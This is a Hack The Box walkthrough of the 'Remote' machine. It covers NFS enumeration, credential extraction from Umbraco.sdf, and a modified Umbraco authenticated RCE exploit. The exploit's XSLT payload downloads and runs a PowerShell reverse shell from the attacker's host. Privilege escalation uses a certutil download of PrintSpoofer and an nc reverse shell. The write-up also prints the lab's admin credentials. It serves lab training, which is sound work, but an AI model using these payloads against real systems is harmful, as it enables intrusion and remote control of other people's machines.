## Remote

Difficulty: Easy

### User Flag

```
rustscan -a 10.10.10.180 --ulimit 5000 -- -A -sV -sC -oN nmap.txt -Pn
```

![nmap](https://github.com/b1d0ws/OSCP/assets/58514930/f2a1ecea-e28d-4170-974c-b9c0f79676f5)

<br>

Enumerating directories, we find that umbraco is installed.

```
gobuster dir -u http://remote.htb -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 40
```

![gobuster](https://github.com/b1d0ws/OSCP/assets/58514930/eddf5482-7dc0-407f-babd-68e152a27f07)

<br>

Umbraco has Authenticated RCE.

![searchsploit](https://github.com/b1d0ws/OSCP/assets/58514930/3e6a4155-2354-49ec-a143-86c37b58d29d)

<br>

Looking on other ports, there is a mountable NFS available.  

This NFS has Umbraco settings, so we can read Umbraco.sdf to read credentials. The password is hashes with SHA-1.

```
showmount -e remote.htb
Export list for remote.htb:
/site_backups (everyone)

sudo mkdir /mnt/remote
sudo mount -t nfs remote.htb:site_backups /mnt/remote -o nolock

cp /mnt/remote/App_Data/Umbraco.sdf ~/HTB/Remote

```

![mountNFS](https://github.com/b1d0ws/OSCP/assets/58514930/b753d174-f961-476d-b1cc-d68f6440dcc9)

![umbracoSDF](https://github.com/b1d0ws/OSCP/assets/58514930/4aa49973-6ccd-48f1-a690-172896d3e099)

![crackstation](https://github.com/b1d0ws/OSCP/assets/58514930/bff9c645-916c-46d9-a5b1-7a5b800cbaac)

<br>

With this credentials we can login into Umbraco and get its version.

![umbracoLogin](https://github.com/b1d0ws/OSCP/assets/58514930/892e9548-c3f3-47fa-ab88-400e2e3c61b7)

![umbracoVersion](https://github.com/b1d0ws/OSCP/assets/58514930/6f496a0e-8482-494b-ac4e-c4cf4d9b1a99)

<br>

The version is the same as the RCE, so we can use it.  

Edit the payload and get a reverse shell.

```
searchsploit umbraco
searchsploit -m aspx/webapps/46153.py

# Command
powershell.exe IEX ( IWR http://10.10.14.21:Invoke-PowerShellTcp.ps1 -UseBasicParsing)

# Modify exploit

payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
{ string cmd = "IEX ( IWR http://10.10.14.21/Invoke-PowerShellTcp.ps1 -UseBasicParsing)"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
 </xsl:template> </xsl:stylesheet> ';

login = "admin@htb.local";
password="baconandcheese";
host = "http://remote.htb";

python3 46153.py
```

![exploit](https://github.com/b1d0ws/OSCP/assets/58514930/169fb5e9-eb34-45b0-bb46-69a5bfb1efbd)

![reverseShell](https://github.com/b1d0ws/OSCP/assets/58514930/9b9f194a-ca5a-4005-a8c1-b2bcf5957372)

<br>

### Root Flag

Our user has SeImpersonatePrivilege, so we can abuse it.  

Since the machine is Windows Server 2019, we need to use [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) or RoguePotato. JuicyPotato doesn't works here.

```
whoami /priv

systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"

certutil -urlcache -f http://10.10.14.21/PrintSpoofer64.exe PrintSpoofer64.exe

.\PrintSpoofer64.exe -c "nc.exe 10.10.14.21 3333 -e cmd"
```

![seImpersonatePrivilege](https://github.com/b1d0ws/OSCP/assets/58514930/7023a63a-394a-4807-9005-12f9caa05784)

![privEsc](https://github.com/b1d0ws/OSCP/assets/58514930/c9cee1b6-bbf1-47d0-83b8-7336aa5d771d)
